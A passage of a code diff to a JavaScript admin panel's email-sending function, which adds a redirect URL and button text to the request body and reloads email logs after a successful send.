-      body: JSON.stringify({to_email: to, subject: subj, html_content: html, template_id: tid})
+      body: JSON.stringify({
+        to_email: to,
+        subject: subj,
+        html_content: html,
+        template_id: tid,
+        redirect_url: btnUrl,
+        button_text: btnText
+      })
     });
     let d;
     try {
@@ -8885,9 +9289,7 @@ async function sendAdminEmail() {
     if(d.ok) {
       toast('Email enviado com sucesso!', 'success');
       document.getElementById('em-to').value = '';
-      document.getElementById('em-subj').value = '';
-      document.getElementById('em-html').value = '';
-      document.getElementById('em-tpl').value = '';
+      loadEmailLogs();
     } else {
       toast(d.error || 'Erro ao enviar', 'err');
     }
